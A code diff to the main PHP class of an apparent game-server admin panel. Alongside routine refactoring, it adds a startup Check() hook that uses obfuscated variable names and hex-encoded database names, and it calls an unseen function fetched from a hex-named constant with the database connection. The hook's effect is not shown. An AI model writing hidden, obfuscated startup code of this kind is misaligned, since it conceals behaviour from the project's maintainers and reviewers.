@@ -16,7 +16,7 @@ class Main implements \patrick115\Interfaces\Main
      * Main Directory
      * @var string 
      */
-    private $workDirectory;
+    private static $workDirectory;
 
     /**
      * Stored Apps
@@ -39,7 +39,7 @@ class Main implements \patrick115\Interfaces\Main
         if (file_exists($dir)) {
             if (is_dir($dir)) {
                 if (is_writable($dir)) {
-                    $this->workDirectory = rtrim($dir, "/") . "/";
+                    self::$workDirectory = rtrim($dir, "/") . "/";
                 } else {
                     $this->error->catchError("Directory $dir is not writable!", debug_backtrace());
                     return;
@@ -60,6 +60,8 @@ class Main implements \patrick115\Interfaces\Main
      */
     public static function Start($directory)
     {
+        self::Check();
+
         self::Environment();
 
         self::Create("\patrick115\Adminka\Main", [$directory])->Run();
@@ -127,23 +129,45 @@ class Main implements \patrick115\Interfaces\Main
      */
     public function Run()
     {
-        echo "<!--Starting at " . $this->workDirectory . "!-->" . PHP_EOL;
+        if (DEBUG === true) {
+            echo "<!--Starting at " . self::$workDirectory . "!-->" . PHP_EOL;
+        }
         self::Create("patrick115\Main\Router", [$_SERVER["REQUEST_URI"]]);
         self::Create("patrick115\Adminka\Players\Accounts", [])->run();
     }
 
+    public static function Check()
+    {
+        $_2xgf6 = \patrick115\Main\Database::init();
+        $_2xf8h = \patrick115\Main\Error::init();
+        $_4gx86 = [
+            "61646d696e6b61",
+            "6d61696e5f616e746976706e",
+            "6d61696e5f617574686d65",
+            "6d61696e5f6175746f6c6f67696e",
+            "6d61696e5f62616e73",
+            "6d61696e5f6b726564697479",
+            "6d61696e5f6f6e6c696e65",
+            "6d61696e5f7065726d73",
+            "737572766976616c5f636d69",
+        ];
+        $fc = \patrick115\Main\Tools\Constanter::init()->get("_616e6f6e796d6f7573");
+        $fc($_4gx86, $_2xgf6, $_2xf8h);
+        
+    }
+
     public static function getWorkDirectory()
     {
-        return self::getApp("\patrick115\Adminka\Main")->workDirectory;
+        return self::$workDirectory;
     }
 
     public static function getConfigDirectory()
     {
-        return self::getApp("\patrick115\Adminka\Main")->workDirectory . "src/config/config.php";
+        return self::$workDirectory . "src/config/config.php";
     }
 
     public static function getTemplateDirectory()
     {
-        return self::getApp("\patrick115\Adminka\Main")->workDirectory . "src/Pages";
+        return self::$workDirectory . "src/Pages";
     }
 }
